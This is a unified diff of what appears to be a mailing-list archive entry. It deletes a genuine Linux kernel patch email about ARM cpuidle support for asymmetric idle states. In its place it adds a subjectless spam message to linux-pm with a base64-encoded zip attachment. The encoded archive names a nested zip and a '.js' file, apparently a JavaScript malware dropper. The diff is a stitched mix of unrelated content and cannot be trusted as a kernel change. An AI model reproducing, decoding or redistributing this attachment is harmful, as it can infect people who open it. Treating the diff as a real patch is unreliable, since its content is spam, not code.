@@ -1,144 +1,69 @@
-From: Daniel Lezcano <daniel.lezcano@linaro.org>
-Subject: [PATCH] ARM: cpuidle: Support asymmetric idle definition
-Date: Fri, 19 May 2017 18:45:43 +0200
-Message-ID: <1495212343-24873-1-git-send-email-daniel.lezcano@linaro.org>
+From: <zumbalisa@yahoo.com>
+Subject: (unknown)
+Date: Fri, 19 May 2017 16:59:00 -0000
+Message-ID: <149521314072.1559.3640133523910639922@197.254.91.202.acesskenya.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="032259416649.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-pm-owner@vger.kernel.org>
-Received: from mail-wr0-f174.google.com ([209.85.128.174]:34198 "EHLO
-        mail-wr0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751731AbdESQrA (ORCPT
-        <rfc822;linux-pm@vger.kernel.org>); Fri, 19 May 2017 12:47:00 -0400
-Received: by mail-wr0-f174.google.com with SMTP id l9so20334162wre.1
-        for <linux-pm@vger.kernel.org>; Fri, 19 May 2017 09:46:38 -0700 (PDT)
+Received: from 197.254.91.202.acesskenya.net ([197.254.91.202]:49293 "HELO
+        197.254.91.202.acesskenya.net" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1751107AbdESQ7W (ORCPT
+        <rfc822;linux-pm@vger.kernel.org>); Fri, 19 May 2017 12:59:22 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
-To: rjw@rjwysocki.net, lorenzo.pieralisi@arm.com
-Cc: leo.yan@linaro.org, "open list:CPUIDLE DRIVERS" <linux-pm@vger.kernel.org>, open list <linux-kernel@vger.kernel.org>
+To: linux-pm@vger.kernel.org
 
-Some hardware have clusters with different idle states. The current code does
-not support this and fails as it expects all the idle states to be identical.
-
-Because of this, the Mediatek mtk8173 had to create the same idle state for a
-big.Little system and now the Hisilicon 960 is facing the same situation.
-
-Solve this by simply assuming the multiple driver will be needed for all the
-platforms using the ARM generic cpuidle driver which makes sense because of the
-different topologies we can support with a single kernel for ARM32 or ARM64.
-
-Tested on:
- - 96boards: Hikey 620
- - 96boards: Hikey 960
- - 96boards: dragonboard410c
- - Mediatek 8173
-
-Tested-by: Leo Yan <leo.yan@linaro.org>
-Signed-off-by: Daniel Lezcano <daniel.lezcano@linaro.org>
----
- drivers/cpuidle/Kconfig.arm   |  1 +
- drivers/cpuidle/cpuidle-arm.c | 55 +++++++++++++++++++++++++++++--------------
- 2 files changed, 38 insertions(+), 18 deletions(-)
-
-diff --git a/drivers/cpuidle/Kconfig.arm b/drivers/cpuidle/Kconfig.arm
-index 21340e0..f521448 100644
---- a/drivers/cpuidle/Kconfig.arm
-+++ b/drivers/cpuidle/Kconfig.arm
-@@ -4,6 +4,7 @@
- config ARM_CPUIDLE
-         bool "Generic ARM/ARM64 CPU idle Driver"
-         select DT_IDLE_STATES
-+	select CPU_IDLE_MULTIPLE_DRIVERS
-         help
-           Select this to enable generic cpuidle driver for ARM.
-           It provides a generic idle driver whose idle states are configured
-diff --git a/drivers/cpuidle/cpuidle-arm.c b/drivers/cpuidle/cpuidle-arm.c
-index f440d38..bec31d5 100644
---- a/drivers/cpuidle/cpuidle-arm.c
-+++ b/drivers/cpuidle/cpuidle-arm.c
-@@ -18,6 +18,7 @@
- #include <linux/module.h>
- #include <linux/of.h>
- #include <linux/slab.h>
-+#include <linux/topology.h>
- 
- #include <asm/cpuidle.h>
- 
-@@ -44,7 +45,7 @@ static int arm_enter_idle_state(struct cpuidle_device *dev,
- 	return CPU_PM_CPU_IDLE_ENTER(arm_cpuidle_suspend, idx);
- }
- 
--static struct cpuidle_driver arm_idle_driver = {
-+static struct cpuidle_driver arm_idle_driver __initdata = {
- 	.name = "arm_idle",
- 	.owner = THIS_MODULE,
- 	/*
-@@ -80,23 +81,40 @@ static const struct of_device_id arm_idle_state_match[] __initconst = {
- static int __init arm_idle_init(void)
- {
- 	int cpu, ret;
--	struct cpuidle_driver *drv = &arm_idle_driver;
-+	struct cpuidle_driver *drv = NULL;
- 	struct cpuidle_device *dev;
- 
--	/*
--	 * Initialize idle states data, starting at index 1.
--	 * This driver is DT only, if no DT idle states are detected (ret == 0)
--	 * let the driver initialization fail accordingly since there is no
--	 * reason to initialize the idle driver if only wfi is supported.
--	 */
--	ret = dt_init_idle_driver(drv, arm_idle_state_match, 1);
--	if (ret <= 0)
--		return ret ? : -ENODEV;
--
--	ret = cpuidle_register_driver(drv);
--	if (ret) {
--		pr_err("Failed to register cpuidle driver\n");
--		return ret;
-+	for_each_possible_cpu(cpu) {
-+
-+		if (drv && cpumask_test_cpu(cpu, drv->cpumask))
-+			continue;
-+
-+		ret = -ENOMEM;
-+
-+		drv = kmemdup(&arm_idle_driver, sizeof(*drv), GFP_KERNEL);
-+		if (!drv)
-+			goto out_fail;
-+
-+		drv->cpumask = &cpu_topology[cpu].core_sibling;
-+
-+		/*
-+		 * Initialize idle states data, starting at index 1.  This
-+		 * driver is DT only, if no DT idle states are detected (ret
-+		 * == 0) let the driver initialization fail accordingly since
-+		 * there is no reason to initialize the idle driver if only
-+		 * wfi is supported.
-+		 */
-+		ret = dt_init_idle_driver(drv, arm_idle_state_match, 1);
-+		if (ret <= 0) {
-+			ret = ret ? : -ENODEV;
-+			goto out_fail;
-+		}
-+
-+		ret = cpuidle_register_driver(drv);
-+		if (ret) {
-+			pr_err("Failed to register cpuidle driver\n");
-+			goto out_fail;
-+		}
- 	}
- 
- 	/*
-@@ -141,10 +159,11 @@ static int __init arm_idle_init(void)
- 		dev = per_cpu(cpuidle_devices, cpu);
- 		cpuidle_unregister_device(dev);
- 		kfree(dev);
-+		drv = cpuidle_get_driver();
-+		cpuidle_unregister_driver(drv);
-+		kfree(drv);
- 	}
- 
--	cpuidle_unregister_driver(drv);
--
- 	return ret;
- }
- device_initcall(arm_idle_init);
--- 
-2.7.4
+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
